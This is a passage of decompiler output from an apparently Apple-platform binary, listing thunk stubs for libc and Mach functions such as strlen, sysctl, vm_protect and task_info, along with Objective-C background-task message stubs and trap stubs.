size_t __cdecl strlcat(char *__dst, const char *__source, size_t __size)
{
  return _strlcat(__dst, __source, __size);
}


////////////////////////////////////////////////////////////////////////
// Function: _strlcpy
// Address:  0xB5F8  Size: 12 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
size_t __cdecl strlcpy(char *__dst, const char *__source, size_t __size)
{
  return _strlcpy(__dst, __source, __size);
}


////////////////////////////////////////////////////////////////////////
// Function: _strlen
// Address:  0xB604  Size: 12 bytes
// Xrefs:    13 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
size_t __cdecl strlen(const char *__s)
{
  return _strlen(__s);
}


////////////////////////////////////////////////////////////////////////
// Function: _strncasecmp
// Address:  0xB610  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
int __cdecl strncasecmp(const char *a1, const char *a2, size_t a3)
{
  return _strncasecmp(a1, a2, a3);
}


////////////////////////////////////////////////////////////////////////
// Function: _strncmp
// Address:  0xB61C  Size: 12 bytes
// Xrefs:    6 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
int __cdecl strncmp(const char *__s1, const char *__s2, size_t __n)
{
  return _strncmp(__s1, __s2, __n);
}


////////////////////////////////////////////////////////////////////////
// Function: _strncpy
// Address:  0xB628  Size: 12 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
char *__cdecl strncpy(char *__dst, const char *__src, size_t __n)
{
  return _strncpy(__dst, __src, __n);
}


////////////////////////////////////////////////////////////////////////
// Function: _strstr
// Address:  0xB634  Size: 12 bytes
// Xrefs:    4 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
char *__cdecl strstr(const char *__big, const char *__little)
{
  return _strstr(__big, __little);
}


////////////////////////////////////////////////////////////////////////
// Function: _sys_dcache_flush
// Address:  0xB640  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
__int64 __fastcall sys_dcache_flush()
{
  return _sys_dcache_flush();
}


////////////////////////////////////////////////////////////////////////
// Function: _sys_icache_invalidate
// Address:  0xB64C  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
__int64 __fastcall sys_icache_invalidate()
{
  return _sys_icache_invalidate();
}


////////////////////////////////////////////////////////////////////////
// Function: _sysctl
// Address:  0xB658  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
int __cdecl sysctl(int *a1, u_int a2, void *a3, size_t *a4, void *a5, size_t a6)
{
  return _sysctl(a1, a2, a3, a4, a5, a6);
}


////////////////////////////////////////////////////////////////////////
// Function: _sysctlbyname
// Address:  0xB664  Size: 12 bytes
// Xrefs:    3 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
int __cdecl sysctlbyname(const char *a1, void *a2, size_t *a3, void *a4, size_t a5)
{
  return _sysctlbyname(a1, a2, a3, a4, a5);
}


////////////////////////////////////////////////////////////////////////
// Function: _task_info
// Address:  0xB670  Size: 12 bytes
// Xrefs:    3 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
kern_return_t __cdecl task_info(
        task_name_t target_task,
        task_flavor_t flavor,
        task_info_t task_info_out,
        mach_msg_type_number_t *task_info_outCnt)
{
  return _task_info(target_task, flavor, task_info_out, task_info_outCnt);
}


////////////////////////////////////////////////////////////////////////
// Function: _thread_switch
// Address:  0xB67C  Size: 12 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
kern_return_t __cdecl thread_switch(mach_port_name_t thread_name, int option, mach_msg_timeout_t option_time)
{
  return _thread_switch(thread_name, option, option_time);
}


////////////////////////////////////////////////////////////////////////
// Function: _uname
// Address:  0xB688  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
int __cdecl uname(utsname *a1)
{
  return _uname(a1);
}


////////////////////////////////////////////////////////////////////////
// Function: _vm_allocate
// Address:  0xB694  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
kern_return_t __cdecl vm_allocate(vm_map_t target_task, vm_address_t *address, vm_size_t size, int flags)
{
  return _vm_allocate(target_task, address, size, flags);
}


////////////////////////////////////////////////////////////////////////
// Function: _vm_protect
// Address:  0xB6A0  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
kern_return_t __cdecl vm_protect(
        vm_map_t target_task,
        vm_address_t address,
        vm_size_t size,
        boolean_t set_maximum,
        vm_prot_t new_protection)
{
  return _vm_protect(target_task, address, size, set_maximum, new_protection);
}


////////////////////////////////////////////////////////////////////////
// Function: _vm_region_64
// Address:  0xB6AC  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
kern_return_t __cdecl vm_region_64(
        vm_map_t target_task,
        vm_address_t *address,
        vm_size_t *size,
        vm_region_flavor_t flavor,
        vm_region_info_t info,
        mach_msg_type_number_t *infoCnt,
        mach_port_t *object_name)
{
  return _vm_region_64(target_task, address, size, flavor, info, infoCnt, object_name);
}


////////////////////////////////////////////////////////////////////////
// Function: _vsnprintf
// Address:  0xB6B8  Size: 12 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
int __cdecl vsnprintf(char *__str, size_t __size, const char *__format, va_list a4)
{
  return _vsnprintf(__str, __size, __format, a4);
}


////////////////////////////////////////////////////////////////////////
// Function: _objc_msgSend$beginBackgroundTaskWithExpirationHandler:
// Address:  0xBB20  Size: 20 bytes
// Xrefs:    1 callers
// Strings:  "beginBackgroundTaskWithExpirationHandler:"
////////////////////////////////////////////////////////////////////////

id objc_msgSend_beginBackgroundTaskWithExpirationHandler_(void *a1, const char *a2, ...)
{
  return objc_msgSend(a1, "beginBackgroundTaskWithExpirationHandler:");
}


////////////////////////////////////////////////////////////////////////
// Function: sub_BB34
// Address:  0xBB34  Size: 4 bytes
////////////////////////////////////////////////////////////////////////

void __noreturn sub_BB34()
{
  __break(1u);
}


////////////////////////////////////////////////////////////////////////
// Function: sub_BB38
// Address:  0xBB38  Size: 4 bytes
////////////////////////////////////////////////////////////////////////

void __noreturn sub_BB38()
{
  __break(1u);
}


////////////////////////////////////////////////////////////////////////
// Function: sub_BB3C
// Address:  0xBB3C  Size: 4 bytes
////////////////////////////////////////////////////////////////////////

void __noreturn sub_BB3C()
{
  __break(1u);
}


////////////////////////////////////////////////////////////////////////
// Function: _objc_msgSend$endBackgroundTask:
// Address:  0xBB40  Size: 20 bytes
// Xrefs:    2 callers
// Strings:  "endBackgroundTask:"
////////////////////////////////////////////////////////////////////////

id objc_msgSend_endBackgroundTask_(void *a1, const char *a2, ...)
{
  return objc_msgSend(a1, "endBackgroundTask:");
}


////////////////////////////////////////////////////////////////////////
// Function: sub_BB54
// Address:  0xBB54  Size: 4 bytes
////////////////////////////////////////////////////////////////////////

void __noreturn sub_BB54()
{
  __break(1u);
  JUMPOUT(0xBB58);
}

